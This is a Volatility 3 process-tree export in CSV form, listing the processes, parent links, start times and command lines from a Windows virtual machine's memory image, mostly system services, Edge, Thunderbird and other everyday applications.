Volatility 3 Framework 2.8.0,,,,,,,,,,,,
,,,,,,,,,,,,
PID,PPID,ImageFileName,Offset(V),Threads,Handles,SessionId,Wow64,CreateTime,ExitTime,Audit,Cmd,Path
** 1680,628,svchost.exe,0xc90c0350d080,6,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k appmodel -p,C:\Windows\system32\svchost.exe
** 9340,628,svchost.exe,0xc90c09ad4080,3,-,0,FALSE,2024-07-15 04:14:05.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k WbioSvcGroup,C:\Windows\system32\svchost.exe
** 1688,628,svchost.exe,0xc90c03509080,5,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,-,-
** 1944,628,svchost.exe,0xc90c080cc080,16,-,0,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p,C:\Windows\system32\svchost.exe
** 1696,628,svchost.exe,0xc90c03507080,15,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,-,-
** 1952,628,svchost.exe,0xc90c080cd080,10,-,0,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,-,-
** 2080,628,svchost.exe,0xc90c0821f080,13,-,0,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k utcsvc -p,C:\Windows\System32\svchost.exe
** 420,628,svchost.exe,0xc90c07d462c0,16,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p,C:\Windows\system32\svchost.exe
** 7460,628,OfficeClickToR,0xc90c0c8ea080,19,-,0,FALSE,2024-07-15 04:06:45.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,-,-
*** 10108,7460,AppVShNotify.e,0xc90c0c8d7080,3,-,1,FALSE,2024-07-15 04:14:55.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\Common Files\microsoft shared\ClickToRun\AppVShNotify.exe,-,-
** 2216,628,wlms.exe,0xc90c08167240,2,-,0,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\wlms\wlms.exe,-,-
** 2856,628,msdtc.exe,0xc90c08527280,9,-,0,FALSE,2024-07-04 10:44:53.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\msdtc.exe,-,-
** 2736,628,dllhost.exe,0xc90c08548280,11,-,0,FALSE,2024-07-04 10:44:53.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\dllhost.exe,-,-
** 6268,628,SecurityHealth,0xc90c082ab080,9,-,0,FALSE,2024-07-04 10:45:15.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\SecurityHealthService.exe,C:\Windows\system32\SecurityHealthService.exe,C:\Windows\system32\SecurityHealthService.exe
** 3252,628,svchost.exe,0xc90c08759300,14,-,1,FALSE,2024-07-04 10:44:59.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k UnistackSvcGroup,C:\Windows\system32\svchost.exe
** 440,628,svchost.exe,0xc90c07d3e240,73,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs -p,C:\Windows\system32\svchost.exe
*** 3216,440,sihost.exe,0xc90c087450c0,11,-,1,FALSE,2024-07-04 10:44:59.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\sihost.exe,sihost.exe,C:\Windows\system32\sihost.exe
*** 1608,440,taskhostw.exe,0xc90c09762080,5,-,1,FALSE,2024-07-15 04:13:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\taskhostw.exe,taskhostw.exe,C:\Windows\system32\taskhostw.exe
*** 3316,440,taskhostw.exe,0xc90c087d4300,9,-,1,FALSE,2024-07-04 10:44:59.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\taskhostw.exe,taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},C:\Windows\system32\taskhostw.exe
** 2232,628,vm3dservice.ex,0xc90c08169240,3,-,0,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\vm3dservice.exe,-,-
*** 2388,2232,vm3dservice.ex,0xc90c0838a200,4,-,1,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\vm3dservice.exe,-,-
** 832,628,svchost.exe,0xc90c092e2080,7,-,1,FALSE,2024-07-15 07:00:06.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k PrintWorkflow,C:\Windows\system32\svchost.exe
** 1864,628,spoolsv.exe,0xc90c0809f200,12,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe
** 2248,628,vmtoolsd.exe,0xc90c08127080,11,-,0,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\VMware\VMware Tools\vmtoolsd.exe,-,-
** 3148,628,svchost.exe,0xc90c08aad080,11,-,1,FALSE,2024-07-04 10:45:01.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p,C:\Windows\system32\svchost.exe
** 2256,628,VGAuthService.,0xc90c08166080,2,-,0,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe,-,-
** 9296,628,SearchIndexer.,0xc90c07f3a080,17,-,0,FALSE,2024-07-15 04:16:20.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\system32\SearchIndexer.exe
*** 8864,9296,SearchFilterHo,0xc90c0a077080,5,-,0,FALSE,2024-07-15 06:59:00.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\SearchFilterHost.exe,C:\Windows\system32\SearchFilterHost.exe 0 804 808 816 8192 812 788,C:\Windows\system32\SearchFilterHost.exe
*** 6388,9296,SearchProtocol,0xc90c098dc080,7,-,0,FALSE,2024-07-15 06:58:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\SearchProtocolHost.exe,C:\Windows\system32\SearchProtocolHost.exe Global\UsGthrFltPipeMssGthrPipe3_ Global\UsGthrCtrlFltPipeMssGthrPipe3 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"",C:\Windows\system32\SearchProtocolHost.exe
*** 4164,9296,SearchProtocol,0xc90c0863a080,4,-,1,FALSE,2024-07-15 04:17:20.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\SearchProtocolHost.exe,C:\Windows\system32\SearchProtocolHost.exe Global\UsGthrFltPipeMssGthrPipe_S-1-5-21-3274565340-3808842250-3617890653-10012_ Global\UsGthrCtrlFltPipeMssGthrPipe_S-1-5-21-3274565340-3808842250-3617890653-10012 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon""  ""1"",C:\Windows\system32\SearchProtocolHost.exe
** 1112,628,svchost.exe,0xc90c07dc72c0,41,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k LocalService -p,C:\Windows\system32\svchost.exe
** 2272,628,MsMpEng.exe,0xc90c08168080,9,-,0,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\Windows Defender\MsMpEng.exe,C:\Program Files\Windows Defender\MsMpEng.exe,C:\Program Files\Windows Defender\MsMpEng.exe
** 872,628,svchost.exe,0xc90c07c6f2c0,16,-,0,FALSE,2024-07-04 10:44:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k RPCSS -p,C:\Windows\system32\svchost.exe
** 6760,628,svchost.exe,0xc90c09408080,8,-,0,FALSE,2024-07-04 10:46:54.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p,C:\Windows\System32\svchost.exe
** 1260,628,svchost.exe,0xc90c07e7a2c0,24,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k NetworkService -p,C:\Windows\System32\svchost.exe
** 1520,628,svchost.exe,0xc90c07f5a2c0,12,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p,C:\Windows\System32\svchost.exe
*** 7428,1520,audiodg.exe,0xc90c03542080,6,-,0,FALSE,2024-07-15 06:58:15.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\audiodg.exe,C:\Windows\system32\AUDIODG.EXE 0x4f0,C:\Windows\system32\AUDIODG.EXE
** 7792,628,svchost.exe,0xc90c08ee8080,3,-,0,FALSE,2024-07-04 10:46:35.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k LocalService -p,C:\Windows\system32\svchost.exe
** 764,628,svchost.exe,0xc90c07bef240,23,-,0,FALSE,2024-07-04 10:44:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p,C:\Windows\system32\svchost.exe
*** 4356,764,StartMenuExper,0xc90c08c8e080,13,-,1,FALSE,2024-07-04 10:45:02.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe,C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca,C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe
*** 1400,764,RuntimeBroker.,0xc90c0c717080,4,-,1,FALSE,2024-07-15 04:09:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\RuntimeBroker.exe,-,-
*** 2820,764,smartscreen.ex,0xc90c09850080,13,-,1,FALSE,2024-07-15 06:59:57.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\smartscreen.exe,C:\Windows\System32\smartscreen.exe -Embedding,C:\Windows\System32\smartscreen.exe
*** 7176,764,SkypeApp.exe,0xc90c09614080,55,-,1,FALSE,2024-07-04 10:45:57.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\WindowsApps\Microsoft.SkypeApp_14.53.77.0_x64__kzf8qxf38zg5c\SkypeApp.exe,-,-
*** 2828,764,WmiPrvSE.exe,0xc90c0850e080,12,-,0,FALSE,2024-07-04 10:44:53.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\wbem\WmiPrvSE.exe,-,-
*** 4500,764,RuntimeBroker.,0xc90c08e39340,3,-,1,FALSE,2024-07-04 10:45:02.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\RuntimeBroker.exe,-,-
*** 7848,764,RuntimeBroker.,0xc90c09090080,3,-,1,FALSE,2024-07-04 10:46:21.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\RuntimeBroker.exe,-,-
*** 7336,764,RuntimeBroker.,0xc90c09578080,5,-,1,FALSE,2024-07-04 10:46:48.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\RuntimeBroker.exe,-,-
*** 6568,764,Calculator.exe,0xc90c0c2a3080,21,-,1,FALSE,2024-07-15 04:09:51.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\WindowsApps\Microsoft.WindowsCalculator_10.1906.55.0_x64__8wekyb3d8bbwe\Calculator.exe,-,-
*** 6700,764,ApplicationFra,0xc90c07eb0080,12,-,1,FALSE,2024-07-04 10:46:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\ApplicationFrameHost.exe,C:\Windows\system32\ApplicationFrameHost.exe -Embedding,C:\Windows\system32\ApplicationFrameHost.exe
*** 4780,764,RuntimeBroker.,0xc90c0a1ee0c0,3,-,1,FALSE,2024-07-15 04:02:32.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\RuntimeBroker.exe,-,-
*** 5180,764,RuntimeBroker.,0xc90c092cb080,6,-,1,FALSE,2024-07-04 10:45:09.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\RuntimeBroker.exe,-,-
*** 4796,764,RuntimeBroker.,0xc90c091372c0,12,-,1,FALSE,2024-07-04 10:45:03.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe -Embedding,C:\Windows\System32\RuntimeBroker.exe
*** 6212,764,dllhost.exe,0xc90c0a5e4080,7,-,1,FALSE,2024-07-04 10:46:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\dllhost.exe,-,-
*** 4296,764,ShellExperienc,0xc90c06982080,13,-,1,FALSE,2024-07-15 04:02:32.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe,-,-
*** 6604,764,TextInputHost.,0xc90c09950340,10,-,1,FALSE,2024-07-04 10:45:16.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe,C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe -ServerName:InputApp.AppXjd5de1g66v206tj52m9d0dtpppx4cgpn.mca,C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe
*** 4696,764,SearchApp.exe,0xc90c0900b080,52,-,1,FALSE,2024-07-04 10:45:03.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe,,
*** 8280,764,SkypeBackgroun,0xc90c083af080,4,-,1,FALSE,2024-07-15 04:06:48.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\WindowsApps\Microsoft.SkypeApp_14.53.77.0_x64__kzf8qxf38zg5c\SkypeBackgroundHost.exe,-,-
*** 8544,764,dllhost.exe,0xc90c093130c0,5,-,0,FALSE,2024-07-15 04:06:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\dllhost.exe,-,-
*** 7160,764,SearchApp.exe,0xc90c09922080,30,-,1,FALSE,2024-07-15 04:06:33.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe,-,-
*** 6780,764,WWAHost.exe,0xc90c0968a340,31,-,1,FALSE,2024-07-04 10:46:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\WWAHost.exe,-,-
* 748,492,fontdrvhost.ex,0xc90c07be9140,5,-,0,FALSE,2024-07-04 10:44:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\fontdrvhost.exe,-,-
512,484,csrss.exe,0xc90c07176080,13,-,1,FALSE,2024-07-04 10:44:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\csrss.exe,"%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",C:\Windows\system32\csrss.exe
588,484,winlogon.exe,0xc90c07a22080,5,-,1,FALSE,2024-07-04 10:44:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\winlogon.exe,winlogon.exe,C:\Windows\system32\winlogon.exe
* 752,588,fontdrvhost.ex,0xc90c07beb140,5,-,1,FALSE,2024-07-04 10:44:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\fontdrvhost.exe,-,-
* 3616,588,userinit.exe,0xc90c088d2340,0,-,1,FALSE,2024-07-04 10:44:59.000000 UTC,2024-07-04 10:45:23.000000 UTC,\Device\HarddiskVolume3\Windows\System32\userinit.exe,-,-
** 3656,3616,explorer.exe,0xc90c088d1340,111,-,1,FALSE,2024-07-04 10:44:59.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\explorer.exe,C:\Windows\Explorer.EXE,C:\Windows\Explorer.EXE
*** 6368,3656,vmtoolsd.exe,0xc90c093a7080,10,-,1,FALSE,2024-07-04 10:45:15.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\VMware\VMware Tools\vmtoolsd.exe,C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr,C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
*** 5488,3656,msedge.exe,0xc90c09380080,59,-,1,FALSE,2024-07-04 10:45:13.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
**** 5792,5488,msedge.exe,0xc90c09916080,10,-,1,FALSE,2024-07-04 10:45:14.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,-,-
**** 5088,5488,msedge.exe,0xc90c098c9080,11,-,1,FALSE,2024-07-04 10:46:14.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --type=utility --utility-sub-type=edge_search_indexer.mojom.SearchIndexerInterfaceBroker --lang=en-US --service-sandbox-type=search_indexer --message-loop-type-ui --field-trial-handle=7556,i,4550380774351628999,14075719362826743519,262144 --variations-seed-version --mojo-platform-channel-handle=7548 /prefetch:8",C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
**** 1920,5488,msedge.exe,0xc90c0c863080,16,-,1,FALSE,2024-07-15 06:58:45.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,-,-
**** 5540,5488,msedge.exe,0xc90c096020c0,8,-,1,FALSE,2024-07-04 10:45:13.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,-,-
**** 6404,5488,msedge.exe,0xc90c0cbbd300,15,-,1,FALSE,2024-07-15 06:58:52.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,-,-
**** 5768,5488,msedge.exe,0xc90c08eed080,16,-,1,FALSE,2024-07-04 10:45:14.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,-,-
**** 1200,5488,msedge.exe,0xc90c03540080,17,-,1,FALSE,2024-07-15 04:02:53.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,-,-
**** 4464,5488,msedge.exe,0xc90c0963b080,17,-,1,FALSE,2024-07-15 04:17:28.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --type=renderer --disable-gpu-compositing --lang=en-US --js-flags=--ms-user-locale= --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=145 --time-ticks-at-unix-epoch=-1720089883345586 --launch-time-ticks=1128944393 --field-trial-handle=10996,i,4550380774351628999,14075719362826743519,262144 --variations-seed-version --mojo-platform-channel-handle=9344 /prefetch:1",C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
**** 1880,5488,msedge.exe,0xc90c0963a080,17,-,1,FALSE,2024-07-15 04:19:01.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --type=renderer --disable-gpu-compositing --lang=en-US --js-flags=--ms-user-locale= --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=153 --time-ticks-at-unix-epoch=-1720089883345586 --launch-time-ticks=1222488836 --field-trial-handle=10948,i,4550380774351628999,14075719362826743519,262144 --variations-seed-version --mojo-platform-channel-handle=7820 /prefetch:1",C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
**** 5780,5488,msedge.exe,0xc90c092ec080,18,-,1,FALSE,2024-07-04 10:45:14.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --field-trial-handle=1928,i,4550380774351628999,14075719362826743519,262144 --variations-seed-version --mojo-platform-channel-handle=2684 /prefetch:3",C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
**** 7540,5488,msedge.exe,0xc90c095da080,18,-,1,FALSE,2024-07-04 10:45:35.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,-,-
**** 10136,5488,msedge.exe,0xc90c0c9b9080,10,-,1,FALSE,2024-07-15 04:18:53.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,-,-
*** 8720,3656,notepad.exe,0xc90c098d2080,1,-,1,FALSE,2024-07-15 04:08:10.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\notepad.exe,C:\Windows\system32\notepad.exe,C:\Windows\system32\notepad.exe
*** 5364,3656,thunderbird.ex,0xc90c09307080,50,-,1,FALSE,2024-07-15 04:03:59.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\Mozilla Thunderbird\thunderbird.exe,C:\Program Files\Mozilla Thunderbird\thunderbird.exe,C:\Program Files\Mozilla Thunderbird\thunderbird.exe
**** 8332,5364,thunderbird.ex,0xc90c0c86d080,16,-,1,FALSE,2024-07-15 04:04:12.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\Mozilla Thunderbird\thunderbird.exe,-,-
**** 4492,5364,thunderbird.ex,0xc90c095ad080,16,-,1,FALSE,2024-07-15 04:04:00.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\Mozilla Thunderbird\thunderbird.exe,-,-
**** 8600,5364,thunderbird.ex,0xc90c0c41b080,15,-,1,FALSE,2024-07-15 04:04:03.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\Mozilla Thunderbird\thunderbird.exe,-,-
**** 3004,5364,thunderbird.ex,0xc90c095ab080,4,-,1,FALSE,2024-07-15 04:09:02.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\Mozilla Thunderbird\thunderbird.exe,-,-
**** 3644,5364,thunderbird.ex,0xc90c0c750080,4,-,1,FALSE,2024-07-15 04:09:02.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\Mozilla Thunderbird\thunderbird.exe,-,-
